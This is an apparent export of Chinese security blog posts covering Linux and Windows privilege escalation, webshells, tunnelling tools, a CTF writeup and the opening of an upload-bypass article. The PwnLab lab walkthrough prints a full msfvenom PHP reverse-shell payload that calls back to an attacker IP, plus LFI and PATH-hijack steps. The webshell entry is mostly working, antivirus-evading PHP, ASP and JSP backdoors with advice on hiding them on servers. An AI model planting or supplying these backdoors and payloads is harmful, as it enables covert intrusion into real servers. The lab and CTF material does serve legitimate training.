    <url>%2F2016%2F12%2FLinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[记录之前所写的东西 先来一张图吧。 前言当拥有了一个shell，依然可能会有一些拒绝执行指令的限制，而为了获得目标主机的完整控制权限，则需要在未授权的地方绕过权限控制。 Metasploit 拥有各种不同技术的exploits，能用于目标机器上进行尝试获取系统级权限。除此之外，还有一些在linux下使用的脚本，方便在尝试提升权限的时候处理。通常它们的目的是枚举系统信息而不是给出具体的vulnerabilities/exploits，使用这种类型的脚本将会节省很多时间。 辅助脚本LinEnum可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本 作用： 隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。 系统信息：主机名，网络详情，当前IP等等。 用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。 下载执行：12git clone https://github.com/rebootuser/LinEnum.git./LinEnum.sh 得出的信息很详细 Linuxprivchecker由python实现，用来对被控制的系统提供建议的exploits。 http://www.securitysift.com/download/linuxprivchecker.py 这个脚本会枚举文件和目录的权限和内容。这个脚本和LinEnum工作方式一样，只是在关于系统网络和用户方面搜寻相比前者对象的详细。 Linux Exploit Suggester基于操作系统的内核版本号。 它是一个不同于以上工具的Perl脚本。使用下列命令下载这个脚本。1git clone https://github.com/PenturaLabs/Linux_Exploit_Suggester.git 先使用uname -r来查看内核版本，再使用-k来制定内核版本，然后返回一个包含了可能exploits的列表。 Unix-Privesc-checker在UNIX系统上检测权限提升向量的shell脚本。 用于寻找那些在未授权用户可以对其他用户或本地应用程序进行提升权限的错误配置。 因为这个脚本是编写的单个shell脚本，所以会比较容易上传和执行，可以被普通用户执行。当它发现一个组可写(group-writable)的文件或目录时，而如果这个组包含了超过一个的非root成员，就会标记出来。1git clone https://github.com/pentestmonkey/unix-privesc-check.git 这个用起来有点诡异。 利用linux内核漏洞提权本地环境： 利用低权限用户目录下可被Root权限用户调用的脚本提权待续。。。。 利用环境变量劫持高权限程序提权前戏将PwnLab-Init导入VM，在kali操作，使用Netdiscover工具扫描局域网中所有的主机 使用nmap扫描发现开了80,3306端口，尝试访问登录和上传页面，登录页面URL结构：/?page=login，看到这个结构，就应该想到是文件包含当我需要知道用户名和密码，我们将使用Nikto的命令找出哪些是它们存储的文件。 12345678910111213141516171819202122232425262728root@RcoIl:~# nikto -h 192.168.1.122- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.122+ Target Hostname: 192.168.1.122+ Target Port: 80+ Start Time: 2016-12-06 13:11:39 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ IP address found in the &apos;location&apos; header. The IP is &quot;127.0.1.1&quot;.+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &quot;http://127.0.1.1/images/&quot;.+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.+ Cookie PHPSESSID created without the httponly flag+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ /config.php: PHP Config file may contain database IDs and passwords.+ OSVDB-3268: /images/: Directory indexing found.+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 + OSVDB-3233: /icons/README: Apache default file found.+ /login.php: Admin login page/section found.+ 7535 requests: 0 error(s) and 14 item(s) reported on remote host+ End Time: 2016-12-06 13:11:39 (GMT8) (19 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 正如你所看到18行的，/config.php是PHP配置文件，可能包含数据库ID和密码。现在知道文件名，可以使用curl命令来查找该文件中的数据。 使用php://filter/convert.base64-encode/resource=尝试读取index.php 不需要加.php，猜想结构如下123&lt;?php if(isset($_GET[&apos;page&apos;]))&#123;include($_GET[&apos;page&apos;].&quot;.php&quot;)?&gt; 事实上解密后发现结构就是这样。 读取config.php的内容如下:1234$server = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;H4u%QJ_H99&quot;;$database = &quot;Users&quot;; 连接数据库去找登录的账号密码kent Sld6WHVCSkpOeQ== (JWzXuBJJNy)mike U0lmZHNURW42SQ== (SIfdsTEn6I)kane aVN2NVltMkdSbw== (iSv5Ym2GRo) 当然也可以读取login和upload，这样就知道结构是怎样的。既然要上传，那看看upload.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpsession_start();if (!isset($_SESSION[&apos;user&apos;])) &#123; die(&apos;You must be log in.&apos;); &#125;?&gt;&lt;html&gt; &lt;body&gt; &lt;form action=&apos;&apos; method=&apos;post&apos; enctype=&apos;multipart/form-data&apos;&gt; &lt;input type=&apos;file&apos; name=&apos;file&apos; id=&apos;file&apos; /&gt; &lt;input type=&apos;submit&apos; name=&apos;submit&apos; value=&apos;Upload&apos;/&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($_POST[&apos;submit&apos;])) &#123; if ($_FILES[&apos;file&apos;][&apos;error&apos;] &lt;= 0) &#123; $filename = $_FILES[&apos;file&apos;][&apos;name&apos;]; $filetype = $_FILES[&apos;file&apos;][&apos;type&apos;]; $uploaddir = &apos;upload/&apos;; $file_ext = strrchr($filename, &apos;.&apos;); $imageinfo = getimagesize($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]); $whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); if (!(in_array($file_ext, $whitelist))) &#123; die(&apos;Not allowed extension, please upload images only.&apos;); &#125; if(strpos($filetype,&apos;image&apos;) === false) &#123; die(&apos;Error 001&apos;); //文件类型必须是image &#125; if($imageinfo[&apos;mime&apos;] != &apos;image/gif&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpeg&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpg&apos;&amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/png&apos;) &#123; die(&apos;Error 002&apos;); //mime必须是图片类型的 &#125; if(substr_count($filetype, &apos;/&apos;)&gt;1)&#123; die(&apos;Error 003&apos;);//检测文件类型 &#125; $uploadfile = $uploaddir . md5(basename($_FILES[&apos;file&apos;][&apos;name&apos;])).$file_ext; if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $uploadfile)) &#123; echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;; &#125; else &#123; die(&apos;Error 4&apos;);//检测imageinfo &#125; &#125;&#125;?&gt; 所以，php文件是不能直接上传的，图片上传命名是md5命名。那我们就绕文件类型，文件内容。直接用msfvenom来生成一个反弹脚本，然后进行尝试。123456root@RcoIl:~# msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.107 lort=4444 -f rawNo platform was selected, choosing Msf::Module::Platform::PHP from the payloadNo Arch selected, selecting Arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 949 bytes/*&lt;?php /**/ error_reporting(0); $ip = &apos;192.168.1.107&apos;; $port = 4444; if (($f = &apos;stream_socket_client&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &apos;stream&apos;; &#125; elseif (($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &apos;stream&apos;; &#125; elseif (($f = &apos;socket_create&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &apos;socket&apos;; &#125; else &#123; die(&apos;no socket funcs&apos;); &#125; if (!$s) &#123; die(&apos;no socket&apos;); &#125; switch ($s_type) &#123; case &apos;stream&apos;: $len = fread($s, 4); break; case &apos;socket&apos;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&apos;len&apos;]; $b = &apos;&apos;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &apos;stream&apos;: $b .= fread($s, $len-strlen($b)); break; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&apos;msgsock&apos;] = $s; $GLOBALS[&apos;msgsock_type&apos;] = $s_type; eval($b); die(); 添加个GIF的文件头，GIF98，文件后缀改为GIF，这样是可以上传的。证明这个gif是我们的shell文件，但是不会解析为PHP。尝试了截断之类的都不行。既然有包含，这个可以通过创建包含图像路径的“lang”的cookie的LFI漏洞，抓包修改cookie为 lang=..//upload/df537fdc576e33db40f6f4295b2ea8a0.gif设置监听。 正文得到了一个Meterpreter会话，接下来就是常规的信息收集。123456789101112131415161718meterpreter &gt; sysinfoComputer : pwnlabOS : Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686Meterpreter : php/linuxmeterpreter &gt; shellProcess 1325 created.Channel 1 created.iduid=33(www-data) gid=33(www-data) groups=33(www-data)python -c &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;www-data@pwnlab:/var/www/html$ su kanesu kanePassword: iSv5Ym2GRokane@pwnlab:/var/www/html$ whoamiwhoamikanekane@pwnlab:/var/www/html$ 已经是一个正常用户的一个权限在Kane的home目录下只有一个“msgmike.”文件，用file命令去查看。123456789kane@pwnlab:~$ lslsmsgmikekane@pwnlab:~$ file msgmikefile msgmikemsgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not strippedkane@pwnlab:~$ ./msgmike./msgmikecat: /home/mike/msg.txt: No such file or directory 从上面回显可以看到，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了。通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件。显然cat的权限不够。针对这种情况，我们可以通过设置bash的$path环境变量来利用，通常的$PATH包含12345kane@pwnlab:~$ echo $PATHecho $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gameskane@pwnlab:~$ touch cattouch cat 然而当调用cat命令的时候，cat会从以上目录来存在，如果我们添加$PATH环境变量，则会先从当前目录来寻找cat指令新建cat，添加执行权限1234567891011kane@pwnlab:~$ touch cattouch catkane@pwnlab:~$ export PATH=.export PATH=.kane@pwnlab:~$ echo $PATHecho $PATH.kane@pwnlab:~$ echo &quot;/bin/sh&quot; &gt;catecho &quot;/bin/sh&quot; &gt;catkane@pwnlab:~$ /bin/chmod 755 cat/bin/chmod 755 cat 这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，从而提权。完整的exploit如下12345678910111213141516171819kane@pwnlab:~$ ./msgmike./msgmike$ whoamiwhoami/bin/sh: 1: whoami: not found$ /usr/bin/whoami/usr/bin/whoamimike$ pwdpwd/home/mike$ ./msg2root./msg2rootMessage for root: ; /bin/bash -p; /bin/bash -p bash-4.3#ididuid=1002(mike) gid=1002(mike) euid=0(root) groups=0(root),1003(kane) 看完这篇文章，总会有三个疑问：1、为什么可以使用php://filter/convert.base64-encode/resource=2、在限制了上传类型，上传内容，为什么可以通过cookie进行包含3、提权的时候 ; /bin/bash -p这个是什么意思 其实带着问题去查资料是最好的，要不然是知其然不知其所以然！参考链接：文件包含漏洞谈一谈php://filter的妙用]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows提权总结]]></title>
    <url>%2F2016%2F12%2Fwindows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[记录之前所写的东西 先来一张图吧。 本地提权这个主要是根据补丁号来确定是否存在漏洞的版本。 二做补丁的对比，用下面这个脚本则就很方便1https://github.com/GDSSecurity/Windows-Exploit-Suggester 使用方法： 在目标机子上导出systeminfo Systeminfo&gt;1.txt 使用脚本判断存在的漏洞 python windows-exploit-suggester.py–database 2016-05-31-mssb.xls -systeminfo~/Desktop/1.txt 注意问题如果Exp被杀，则将将Exp改成Powershell参照：MS16-032 windows本地提权 探测中间件这个图上已经说清楚了。 服务提权常用服务Mssql，Mysql，Oracle，Ftp 第三方服务Dll劫持，文件劫持 协议提权利用已知的Windows中的问题，以获得本地权限提升 -&gt; Potato其利用NTLM中继（特别是基于HTTP &gt; SMB中继）和NBNS欺骗进行提权。 Potato(邪恶土豆)–windows全版本猥琐提权 剩下的就慢慢补上了。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web后门 一句话]]></title>
    <url>%2F2016%2F11%2FWeb%E5%90%8E%E9%97%A8%20%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
    <content type="text"><![CDATA[找到了快照，记录之前所写的东西 过狗其实过狗，反转函数，未知函数（自己挖），还有异或,基本也可以。 demo11&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：php?2=assert密码是1 demo2123&lt;?php ($rcoil = $_POST[&apos;rcoil&apos;]) &amp;&amp; @preg_replace(&apos;/ad/e&apos;,&apos;@&apos;.str_rot13(&apos;riny&apos;).&apos;($rcoil)&apos;, &apos;add&apos;);?&gt; 而str_rot13(‘riny’)编码后为eval，完全避开了关键字，又不失效果，让人吐血！ demo3具体举例使用自定义函数12345&lt;?phpfunktion 我是函数（）&#123;$a=&apos;eval&apos;&#125; $b=我是函数(); $b（$_POST（&quot;a&quot;））;?&gt; 把eval这个函数封装到自定义函数的功能里 狗就不能查杀了,在函数功能里还要返回$a变量的值,return $a;123456&lt;?phpfunction abc($x)&#123;@assert($x);&#125;abc($_REQUEST[&apos;c&apos;]);?&gt; 把return $a;这个写到大括号里,不然assert没返回的话 函数abc就不会等于assert了变量$$也可以过狗,利用的是变量覆盖 demo4避免关键字1&lt;?php @$_++;$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);@$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt; post数据0=assert&amp;1=phpinfo(); 小结：今天看到一篇文章，虽然是两年前，但是想法是对的。其免杀方式在于,在固定区域生成随机名称变量,后借助str_replace拼合base64_decode,执行命令的过程当然,这是在代码层面混淆视听以躲过扫描器 更常用的混淆视听的方法: 修改文件时间 改名融入上传后所在文件夹，让人无法直观看出文件异常 文件大小的伪装处理(至少看起大小像个正常脚本) 选好藏身路径并尽量少的访问 畸形目录%20 经常用到的一句话(大叔)PHP版本：12345678&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e=&apos;($_REQUEST[C])&apos;;@assert($a.$b.$c.$d.$e);?&gt; ASP版本：1&lt;%executeGlobal(StrReverse(Request(Chr(98))))%&gt; 其配置为b=))99(rhC(tseuqeR+lave. 精简Jsp菜刀马1&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;rcoil&quot;;String EC(String s,String c)throws Exception&#123;return s;&#125;Connection GC(String s)throws Exception&#123;String[]x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim())&#125;return c&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n)&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close()&#125;void GG(String s,String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&quot;+&quot;|&quot;);if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb)&#125;&#125;else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb)&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;)&#125;br.close()&#125;else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response)&#125;else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;)&#125;else if(Z.equals(&quot;M&quot;))&#123;String[]c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb)&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb)&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb)&#125;else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb)&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb)&#125;&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString())&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt; 404马1234567891011&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php@preg_replace(&quot;/[pageerror]/e&quot;,$_POST[&apos;error&apos;],&quot;saft&quot;);header(&apos;HTTP/1.1 404 Not Found&apos;);?&gt; 粗糙的内存马1234567891011&lt;?phpignore_user_abort(true);ini_set(&apos;maxdb_execution_time&apos;, 0);while (true) &#123; if(!file_exists(&apos;demo.php&apos;))&#123; $a=&quot;&lt;?php @eval(&quot;.&quot;$&quot;.&quot;_POST&quot;.&quot;[tese])?&gt;&quot;; file_put_contents(&apos;demo.php&apos;,$a); file_put_contents(&apos;demo&apos;, base64_decode()); &#125;&#125;?&gt; Linux截断马12345&lt;?php$webpath = dirname(__FILE__).&quot;/&quot;;$a=&quot;&lt;?php @eval(&quot;.&quot;$&quot;.&quot;_POST&quot;.&quot;[rcoil]);?&gt;&quot;;file_put_contents($webpath .&quot;test.jpg&quot;.chr(9).&quot;.php&quot;, $a);?&gt; //test.jpg%09.php 最后列几个高级的PHP一句话木马后门123456789101112131415161718192021222324252627282930313233343536373839401、 $hh = &quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;; $hh(&quot;/[discuz]/e&quot;,$_POST[&apos;h&apos;],&quot;Access&quot;); //菜刀一句话 2、 $filename=$_GET[&apos;xbid&apos;]; include ($filename); //危险的include函数，直接编译任何文件为php格式运行 3、 $reg=&quot;c&quot;.&quot;o&quot;.&quot;p&quot;.&quot;y&quot;; $reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]); //重命名任何文件 4、 $gzid = &quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;; $gzid(&quot;/[discuz]/e&quot;,$_POST[&apos;h&apos;],&quot;Access&quot;); //菜刀一句话 5、include ($uid); //危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif //gif插一句话 6、典型一句话 程序后门代码 &lt;?php eval_r($_POST[sb])?&gt; 程序代码 &lt;?php @eval_r($_POST[sb])?&gt; //容错代码 程序代码 &lt;?php assert($_POST[sb]);?&gt; //使用lanker一句话客户端的专家模式执行相关的php语句 程序代码 &lt;?$_POST[&apos;sa&apos;]($_POST[&apos;sb&apos;]);?&gt; 程序代码 &lt;?$_POST[&apos;sa&apos;]($_POST[&apos;sb&apos;],$_POST[&apos;sc&apos;])?&gt; 程序代码 &lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&apos;h&apos;],&quot;error&quot;); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入 程序代码 &lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; 程序代码 &lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话 参考：PHP一句话后门]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>一句话</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网边界工具存档]]></title>
    <url>%2F2016%2F11%2F%E5%86%85%E7%BD%91%E8%BE%B9%E7%95%8C%E5%B7%A5%E5%85%B7%E5%AD%98%E6%A1%A3%2F</url>
    <content type="text"><![CDATA[记录一写内网边界工具的地址 mimikatz：https://github.com/gentilkiwi/mimikatz Mocks：https://sourceforge.net/projects/mocks/ Ssocks ：https://sourceforge.net/projects/mocks/ Htran ：https://github.com/zcnhonker/HTran rcsocks：https://github.com/darkk/redsocks reDuh：https://github.com/sensepost/reDuh reGeorg：https://github.com/sensepost/reDuh Tunna：https://github.com/SECFORCE/Tunna reprocks：https://github.com/RicterZ/reprocks]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016年首届南宁市网络安全攻防技术大赛]]></title>
    <url>%2F2016%2F11%2F2016%E5%B9%B4%E9%A6%96%E5%B1%8A%E5%8D%97%E5%AE%81%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[12345678910111213团队信息团队名称:RcoIl队长:RcoIl团队综合答题项:12团队挑战得分:1600团队专业得分:370团队总分:1970团队邀请码:bb45b369ffa690923fd780659f6ba42505396761队员信息用户名 完成项目 总分 注册时间RcoIl 12 1750 2016-10-10想拿500块吃庞姐白切猪脚 1 350 2016-10-21Jearys 2 550 2016-10-24 BasicMyspace Data Dump解法：点击链接 去百度寻找Download Password密码KLub8pT&amp;iU$8oBY(*$NOiu抓包得到Key{bnAQlEosKTqR1WRpuK9oKygb} 意大利Girolanmo Cardano附件：download解法:根据题目描述。知道是意大利人（确切地说，是米兰人）Girolanmo Cardano发明的栅格密码，找个在线解密。the key is 21xzHb4aOcFuIlRt 永不消失的电波。。。权重: 200附件：download解法：打开听声音，应该是摩斯密码。用Audacity打开。一个一个数。最后得出beiin the key is ip773m…-.zmso6w2ou395zlt69..–.end，将中间的…-.进行遍历，或者改成…–(因为最后的这个-长度不确定，所以只能尝试)得出key值 一首小曲权重: 200附件：download解法：附件是一段音乐，尝试了tom和Tom’s-Dinner都没有报错，但是得到的txt都是乱码。见群里说歌词第一个字母是答案，我不敢相信。开始猜密码了gxnnctf2016，就出key了（队友说试了这么密码，但是没出key），坐等官方writeup。 WebWeb200_0题目描述: http://gxnnctf.sosec.net/index.php/Hack/wV5L3UM8TyIP1CnF5E9lIEhm权重: 200 解法：是一个登录框，随便一个账号登陆，提示不是本地管理员，使用admin登陆，也提示，使用X-Forwarded-For进行伪造，但是开始密码没写上admin，所以没解出来（做过的伪造都不用帐密）。所以帐密都为admin，再进行伪造就得到key。 Web200_1题目描述: http://gxnnctf.sosec.net/index.php/Hack/Z6f8VG7iElAnXkgPO68ayGsL权重: 200 解法：一个上传，提示了是window server。限制了文件长度，但是上传回显的只有 filename: filetype: filesize:想将代码写入页面，但是没找到有力的利用方法。然后去找是window绕过的方法，最后用了::$DATA数据流,详情。 Web200_2题目描述: 小黑拿到一webshell，但不知道密码，帮看看吧权重: 200附件：download解法：拿到这个shell文件，把所有的变量的值都打印出来栗子：123456&lt;?phpecho $sNFSM8939 = &quot;py)v95c_*gwr/a;&quot;echo $VgiNDZ6054 = $sNFSM8939[0];echo $epTfZ1186 = &quot;\x29\x29\x29\x3B&quot;.&quot;&lt;br&gt;&quot;;echo $yDeM2817 = $vTIm84.&quot;&apos;TZzXruvcep7PA+QejD8GdhI6Z;&quot;echo $VgiNDZ6054($sNFSM8939[12].$sNFSM8939[40].$sNFS 得到关键函数1eval(gzinflate(base64_decode(&apos;xxxxxxxxxxxxxxxxxx&apos;) 然后将eval改为echo再次运行得到：$auth_pass = “9e4bf26d87b7e8b6b66b0a2305f67184”;登陆上去之后发现是俄罗斯的样本，挺厉害的一个样本，本身也是收藏有的 Web200_3题目描述: 林丹的超级粉:http://gxnnctf.sosec.net/index.php/Hack/lin权重: 200 解法：查看源代码发现了 index.php/Hack/Ve6wwdwOkmK6mqpEL43CqWaq &gt;admin login一个登陆界面，除了一个登陆页面，在首页还有个微博的链接地址，只有这点信息，想到的是社工，但是生成的字典不给力。 MiscMisc200题目描述: 神秘流量。。。权重: 200附件：download 解法：用 WireShark打开，看了看是有一些传输，tcp追踪发现一个tcp里面有两个FFD8FFE000104的十六进制文件，这个文件头又是jpg的文件头，看看文件尾是不是FFD9的，第二个满足条件，将这段十六进制复制出来，粘贴到HxD，保存为JPG格式打开是一张图片，图片上有key。 Misc200题目描述: flag是这样生成的:echo \’flag\’|openssl md5权重: 200附件：download解法：将二维码恢复（可以重组，可以打印出来自己剪 -.-），扫描得出{7XsT?46;EIiH&gt;o773Y~xSUK0jn\RVfh+}a&amp;u}，按照题目要求md5加密，怎么提交都不对，去掉大括号，将题目的反斜杠都去掉，进行加密，最后再提交的时候发现md5前面多了一个空格。。。我就说怎么那么多人解出来。尼玛。 Misc400题目描述: IV就是flag啦。。。。。。。权重: 400附件：download解法：这一题，刚开始以为是枚举，但是算了下次数，运行的话会宕机。再看看图片名字是meitu，尼玛，坑到我，想到是不是美图去掉马赛克，无果。然后这道题搁置了很久，队友去看密码学，找到了分块，密码学课上没学分块啊，老师。大概就是分块，第一块和向量、密钥运算，得出的结果和下一块运算，最后将开头是 7265 就输出（用python是最好的，毕竟是方便的语言）。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞（转载）]]></title>
    <url>%2F2016%2F11%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%89%2F</url>
    <content type="text"><![CDATA[文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）转载：文件上传漏洞（绕过姿势） 文件上传校验姿势 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 文件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定） 客户端校验一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。 判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 服务端校验content-type字段校验这里以PHP代码为例，模拟web服务器端的校验代码123456789101112131415&lt;?php if($_FILES['userfile']['type'] != "image/gif") #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。 &#123; echo "Sorry, we only allow uploading GIF images"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], 